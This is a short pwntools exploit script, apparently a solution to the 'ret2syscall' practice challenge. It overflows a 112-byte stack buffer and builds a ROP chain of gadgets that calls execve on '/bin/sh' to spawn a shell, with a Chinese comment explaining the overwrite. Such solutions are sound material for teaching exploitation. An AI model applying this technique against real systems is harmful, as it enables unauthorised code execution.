from pwn import *

io=process("./ret2syscall")
io.recvline()

# ROPgadget --binary ret2syscall --only "pop|ret" | grep eax
# 0x080bb196 : pop eax ; ret
pop_eax_ret=0x080bb196 

# ROPgadget --binary ret2syscall --only "pop|ret" | grep ebx
# 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx_ret=0x0806eb90 

# ROPgadget --binary ret2syscall --only "int"
# 0x08049421 : int 0x80
int_80h=0x08049421

# elf=ELF("./ret2syscall")
# hex(next(elf.search(b"/bin/sh")))
bin_sh=0x80be408

# payload.hex()
# '6161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616196b10b080b00000090eb0608000000000000000008e40b0821940408'
# 先用112个字节覆盖返回地址之前的栈里的内容，再用pop_eax_ret覆盖返回地址
payload=flat(b'a'*112,pop_eax_ret,0xb,pop_edx_ecx_ebx_ret,0,0,bin_sh,int_80h)
io.sendline(payload)
io.interactive()
